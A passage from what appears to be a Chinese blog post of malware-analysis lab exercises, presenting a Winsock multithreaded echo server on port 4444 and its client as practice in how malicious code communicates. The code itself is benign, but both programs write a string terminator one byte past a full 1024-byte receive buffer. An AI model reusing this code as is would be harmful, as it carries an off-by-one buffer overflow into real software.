<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.exe test.txt &quot;data&quot;</span><br></pre></td></tr></table></figure>

<p><a href="/../img/Malware-Analysis-Practice2/5.png" title="5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/5.png" alt="5"></a></p>
<h2 id="简单多线程服务器"><a href="#简单多线程服务器" class="headerlink" title="简单多线程服务器"></a>简单多线程服务器</h2><h3 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h3><p>编写一个简单的echo服务器程序（即：客户端与服务器建立连接后，在客户端输入消息，服务器端就会打印输入的消息），在4444端口进行监听。每有一个客户端进行连接时候，服务器创建一个子线程，对客户端程序进行服务。需要引入互斥量对共享代码区或全局变量进行互斥访问，要求使用信号传递等待机制。根据要求，客户端代码也需要自行编写。</p>
<h3 id="实验环境-2"><a href="#实验环境-2" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li><p>Windows 7或Windows 10主机（虚拟机）至少两台；</p>
</li>
<li><p>代码编辑器；</p>
</li>
<li><p>C&#x2F;C++代码运行所需环境。</p>
</li>
</ul>
<h3 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解恶意代码在通信时，会使用到的最基本的技术。练习多线程编程。</p>
<h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><h5 id="服务端的代码task3-server-cpp"><a href="#服务端的代码task3-server-cpp" class="headerlink" title="服务端的代码task3_server.cpp"></a>服务端的代码<code>task3_server.cpp</code></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">std::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储客户端信息的结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ClientInfo</span> &#123;</span><br><span class="line">    std::string ip;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储连接的客户端信息的容器</span></span><br><span class="line">std::vector&lt;ClientInfo&gt; connectedClients;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HandleClient</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> bytesReceived;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取客户端地址信息</span></span><br><span class="line">    sockaddr_in clientAddr;</span><br><span class="line">    <span class="type">int</span> addrLen = <span class="built_in">sizeof</span>(clientAddr);</span><br><span class="line">    <span class="built_in">getpeername</span>(clientSocket, (sockaddr*)&amp;clientAddr, &amp;addrLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储客户端信息到容器</span></span><br><span class="line">    <span class="comment">// 保护容器</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">    <span class="comment">// 正在对互斥锁 mtx 进行加锁，当 lock 对象超出范围时（例如，在块或函数的末尾），它会自动释放对互斥锁的锁定。</span></span><br><span class="line">    <span class="comment">// 在这里,每一次循环结束之后就会释放锁。</span></span><br><span class="line">    <span class="comment">// 该mtx是对vector进行保护。</span></span><br><span class="line">    <span class="comment">// 所以这里必须要在大括号中,让mtx出大括号之后就被释放,不然会死锁....</span></span><br><span class="line">    connectedClients.<span class="built_in">push_back</span>(&#123;<span class="built_in">inet_ntoa</span>(clientAddr.sin_addr), <span class="built_in">ntohs</span>(clientAddr.sin_port)&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印当前连接情况</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Client connected. Total clients: &quot;</span> &lt;&lt; connectedClients.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; client : connectedClients) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;   &quot;</span> &lt;&lt; client.ip &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; client.port &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;-----------------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 接收客户端消息</span></span><br><span class="line">        bytesReceived = <span class="built_in">recv</span>(clientSocket, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytesReceived &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 对共享资源使用互斥量进行保护</span></span><br><span class="line">            <span class="comment">// 保护cout</span></span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">            <span class="comment">// 打印客户端信息及消息到本地</span></span><br><span class="line">            buffer[bytesReceived] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Received from &quot;</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">ntohs</span>(clientAddr.sin_port)</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; buffer &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 原样发送消息回客户端</span></span><br><span class="line">            <span class="built_in">send</span>(clientSocket, buffer, bytesReceived, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bytesReceived == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 客户端断开连接</span></span><br><span class="line">            <span class="comment">// 保护cout和容器</span></span><br><span class="line">            std::lock_guard&lt;std::mutex&gt; <span class="built_in">lock</span>(mtx);</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Client &quot;</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">ntohs</span>(clientAddr.sin_port)</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; disconnected.\n&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 从容器中移除断开连接的客户端信息</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> it = connectedClients.<span class="built_in">begin</span>(); it != connectedClients.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">                <span class="keyword">if</span> (it-&gt;ip == <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &amp;&amp; it-&gt;port == <span class="built_in">ntohs</span>(clientAddr.sin_port)) &#123;</span><br><span class="line">                    connectedClients.<span class="built_in">erase</span>(it);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (bytesReceived &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化Winsock</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 创建一个套接字（socket），用于建立网络连接</span></span><br><span class="line">    SOCKET serverSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (serverSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="comment">// 如果创建套接字失败，输出错误信息，清理Winsock并返回错误码1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to create socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址信息</span></span><br><span class="line">    sockaddr_in serverAddr;						   <span class="comment">// 定义一个 sockaddr_in 结构体用于存储服务器地址信息</span></span><br><span class="line">    serverAddr.sin_family = AF_INET;               <span class="comment">// 使用IPv4地址</span></span><br><span class="line">    serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);             <span class="comment">// 设置服务器监听的端口号为4444</span></span><br><span class="line">    serverAddr.sin_addr.s_addr = INADDR_ANY;       <span class="comment">// 服务器监听任何可用的网络接口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定套接字到服务器地址</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">bind</span>(serverSocket, (sockaddr*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="comment">// 如果绑定失败，输出错误信息，关闭套接字，清理Winsock，并返回错误码1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to bind socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听套接字，等待客户端连接请求</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(serverSocket, SOMAXCONN) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="comment">// 如果监听失败，输出错误信息，关闭套接字，清理Winsock，并返回错误码1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to listen on socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Server is listening on port 4444...\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 接受客户端连接</span></span><br><span class="line">        SOCKET clientSocket = <span class="built_in">accept</span>(serverSocket, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Failed to accept client connection.\n&quot;</span>;</span><br><span class="line">            <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建子线程为客户端提供服务</span></span><br><span class="line">        std::<span class="built_in">thread</span>(HandleClient, clientSocket).<span class="built_in">detach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭套接字和清理Winsock</span></span><br><span class="line">    <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码是一个简单的基于Winsock的服务器程序，它监听端口4444，接受客户端连接，然后为每个客户端创建一个新的线程来处理通信。以下是这段代码的主要功能和一些值得注意的地方：</p>
<ol>
<li><p><strong>初始化Winsock：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码用于初始化Winsock库，确保网络库正确启动。</p>
</li>
<li><p><strong>创建套接字并绑定：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOCKET serverSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">bind</span>(serverSocket, (sockaddr*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">listen</span>(serverSocket, SOMAXCONN);</span><br></pre></td></tr></table></figure>

<p>在这里，创建了一个套接字，将其绑定到特定地址和端口，然后开始监听客户端的连接请求。</p>
</li>
<li><p><strong>主循环：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// 接受客户端连接</span></span><br><span class="line">    SOCKET clientSocket = <span class="built_in">accept</span>(serverSocket, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    std::<span class="built_in">thread</span>(HandleClient, clientSocket).<span class="built_in">detach</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器在一个无限循环中等待客户端连接。每当有新的客户端连接时，服务器会为该客户端创建一个新的线程（使用 <code>std::thread</code>）并调用 <code>HandleClient</code> 函数来处理与客户端的通信。</p>
</li>
<li><p><strong>HandleClient函数：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HandleClient</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数负责处理与每个客户端的通信。它首先获取客户端的地址信息，然后将客户端信息存储到 <code>connectedClients</code> 容器中。接着，它进入一个循环，不断接收客户端的消息，处理消息，并在客户端断开连接时进行清理。注意到这些对 <code>connectedClients</code> 容器和输出到 <code>std::cout</code> 的操作都被互斥锁 <code>mtx</code> 保护，以防止多线程访问时的竞争条件。</p>
</li>
<li><p><strong>注意事项：</strong></p>
<ul>
<li>使用了互斥锁 <code>mtx</code> 来保护对 <code>connectedClients</code> 容器的并发访问，确保数据一致性。</li>
<li>为了避免死锁，对 <code>connectedClients</code> 容器的访问被包裹在大括号中，确保在离开大括号时锁被释放。</li>
<li>使用 <code>std::thread(HandleClient, clientSocket).detach();</code> 将客户端处理函数在新线程中运行，但这可能导致线程不能被适当地等待和管理，因此需要小心处理线程的生命周期。</li>
</ul>
</li>
</ol>
<h5 id="客户端的代码task3-client-cpp"><a href="#客户端的代码task3-client-cpp" class="headerlink" title="客户端的代码task3_client.cpp"></a>客户端的代码<code>task3_client.cpp</code></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链接到 ws2_32.lib 库</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数用于将数据发送给服务器</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendDataToServer</span><span class="params">(SOCKET clientSocket, <span class="type">const</span> std::string&amp; message)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 send 函数发送数据到服务器</span></span><br><span class="line">    <span class="type">int</span> bytesSent = <span class="built_in">send</span>(clientSocket, message.<span class="built_in">c_str</span>(), message.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 检查发送是否成功</span></span><br><span class="line">    <span class="keyword">if</span> (bytesSent == SOCKET_ERROR) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to send data to server.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数用于从服务器接收数据</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">receiveDataFromServer</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="comment">// 使用 recv 函数接收从服务器发来的数据</span></span><br><span class="line">    <span class="type">int</span> bytesRead = <span class="built_in">recv</span>(clientSocket, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 处理接收到的数据</span></span><br><span class="line">    <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buffer[bytesRead] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Received from server: &quot;</span> &lt;&lt; buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead == <span class="number">0</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Server closed the connection.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to receive data from server.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化 Winsock 库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建套接字</span></span><br><span class="line">    SOCKET clientSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to create socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址和端口</span></span><br><span class="line">    sockaddr_in serverAddress;</span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);</span><br><span class="line">    serverAddress.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.65.136&quot;</span>);  <span class="comment">// 服务器的 IP 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(clientSocket, (<span class="keyword">struct</span> sockaddr*)&amp;serverAddress, <span class="built_in">sizeof</span>(serverAddress)) == SOCKET_ERROR) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to server.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Connected to server.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::string message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 从命令行输入获取消息</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Enter message (type &#x27;exit&#x27; to close): &quot;</span>;</span><br><span class="line">        std::<span class="built_in">getline</span>(std::cin, message);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果输入 &#x27;exit&#x27;，则退出循环</span></span><br><span class="line">        <span class="keyword">if</span> (message == <span class="string">&quot;exit&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">sendDataToServer</span>(clientSocket,<span class="string">&quot;&quot;</span>);  <span class="comment">//发送的字节数为0，触发server端的disconnect</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 发送消息给服务器</span></span><br><span class="line">        <span class="built_in">sendDataToServer</span>(clientSocket, message);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 接收服务器的响应</span></span><br><span class="line">        <span class="built_in">receiveDataFromServer</span>(clientSocket);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>主要功能和值得注意的地方：</strong></p>
<p><strong>1. 初始化 Winsock 库：</strong></p>
